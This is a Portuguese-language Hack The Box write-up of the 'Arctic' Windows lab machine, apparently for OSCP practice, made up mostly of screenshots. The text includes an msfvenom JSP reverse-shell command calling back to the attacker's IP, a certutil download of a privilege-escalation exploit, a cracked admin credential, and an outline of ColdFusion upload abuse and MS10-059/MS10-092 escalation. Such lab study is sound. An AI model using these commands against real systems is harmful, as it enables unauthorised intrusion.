---
title: "Hack The Box - Arctic"
tags: [Windows,Easy,Coldfusion,Metasploit Framework,Windows Exploit Suggester,MS10-059,Certutil,Impacket SMB,Burpsuite,Unicorn,Meterpreter,MS10-092,Local Exploit Suggester]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_1.png)

Link: <https://www.hackthebox.eu/home/machines/profile/9>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas aberta no servidor

> A porta que nos chama atenção de cara é a *8500*, parece ser um servidor Web

## Enumeração da porta 8500

### Abrimos no navegador e vamos indo através das pastas até encontrar o `administrator`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_web.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_web1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_web2.png)

# Primeiro modo de fazer a máquina --> Sem usar o Metasploit Framework

## Procuramos por exploits para o Coldfusion, uma vez que encontramos ele na porta 8500

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit1.png)

### Testamos o exploit e conseguimos o hash do administrador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit2.png)

### Descobrimos que a senha é `happyday`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit3.png)

> admin:happyday

Logamos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit5.png)

#### Na aba *Debugging and Logging* temos a opção *Scheduled Tasks*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit7.png)

Ele nos da a opção de fazer o download de um arquivo e colocar no servidor, desde que especifiquemos o caminho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit8.png)

### Uma vez que o servidor coldfusion roda `java` devemos criar um payload no formato `.jsp`, para isso utilizaremos o `msfvenom`

> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.119 LPORT=443 -f raw > exploit.jsp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_msfvenom.png)

Bom, agora devemos encontrar o local para upar esse arquivo no servidor, pois ele pede o diretório todo.
Isso encontramos em `Settings -> Mapping`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit10.png)

### Agendamos a tarefa e fazemos o upload do exploit.jsp na pasta CFIDE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit11.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_agendado.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_down.png)

#### Entramos na pasta CFIDE

> http://10.10.10.11:8500/CFIDE/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit12.png)

#### Executamos e ganhamos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_exploit13.png)

# Escalando privilégio

### Rodamos o comando `systeminfo` e copiamos para um arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_systeminfo.png)

### Utilizaremos o `windows exploit suggester` pra verificar exploits para essa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_sug.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_sug1.png)

### Verificamos que temos um monte de vulnerabilidades que podem ser exploradas, iremos explorar a *MS10-059*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_chimi.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_chimi1.png)

### Fazemos o downlaod do executável para dentro da máquina (vamos treinar mais de um modo)

#### Primeiro modo `certutil`

> certutil.exe -urlcache -split -f http://10.10.16.119/Chimichurri.exe Chimichurri.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_chimi2.png)

#### Segundo modo `Impacket-SMB Server`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_chimi3.png)

### Agora vamos executar para escalar privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_chimi4.png)

### Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_root.png)

# Segundo modo de fazer a máquina --> Usando o Metasploit Framework para escalar privilégio

### Aqui devemos voltar a parte de procurar por exploits para explorar o *Coldfusion*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_m.png)

#### Setamos as configurações

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_m1.png)

#### Executamos o exploit e vemos que deu erro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_m2.png)

### Vamos descobrir por que está dando erro

#### Configuração do `Burpsuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b2.png)

#### Configuração do Metasploit Framework para passar pelo Burpsuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_m3.png)

#### Rodamos o exploit novamente e ele vai sair através do Burp, vamos ver o que está acontecendo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_m4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b3.png)

##### Enviamos para o `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b4.png)

> Estamos fazendo uma requisição POST para o CFIDE... O exploit vai no *MGMXMJEYEG.jsp*, o que o Coldfusion está fazendo é combinar o filename com o CurrentFolder pra dar a localização do exploit por isso da, ele 'salva' o exploit em um local em que o Metasploit Framework tem como padrão diferente, o %00 (null byte) sinaliza que acabou ali o arquivo, por isso que não vai.

##### Copiamos a localização do Exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b5.png)

##### Verificamos o que ele faz, pra tentarmos reproduzir manualmente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_b6.png)

##### Executamos manualmente agora e recebemos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_shell.png)

### Agora que conseguimos um shell normal, devemos realizar o upgrade dele

#### Para isso iremos utilizar o `Unicorn`

> A ideia do Unicorn é parecida com a do `Empire`.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un1.png)

#### Fazemos o download para nossa máquina e executamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un2.png)

> powershell_attack.txt --> Comando do PS que deve ser executado na vítima
> unicorn.rc --> Handler do Metasploit Framework para receber de volta um meterpreter

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un3.png)

### Executamos na vítima e recebemos o shell de meterpreter

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un6.png)

#### Procuramos pelo *local_exploit_suggester* para escalar privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un7.png)

#### Setamos as opções nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un8.png)

#### Rodamos o módulo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un9.png)

> Verificamos que ele rodou exploits de x86, mas a máquina é de x64... Inferimos que o meterpreter está sendo executado em x86, então devemos migrar para um processo de x64 e rodar o módulo novamente

#### Mudando de processo e executando novamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un11.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un12.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un13.png)

> Verificamos que alguns exploits repetiram e outros que não estavam apareceram, as vezes realizar essa mudança pode ser muito siginificativo em um pentest, ficar atento a isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un14.png)

# Explorando o MS10-092 Schelevator

#### Pesquisamos pelo exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un15.png)

#### Setamos as configurações

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un16.png)

#### Executamos e escalamos privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un17.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-arctic/Arctic_un18.png)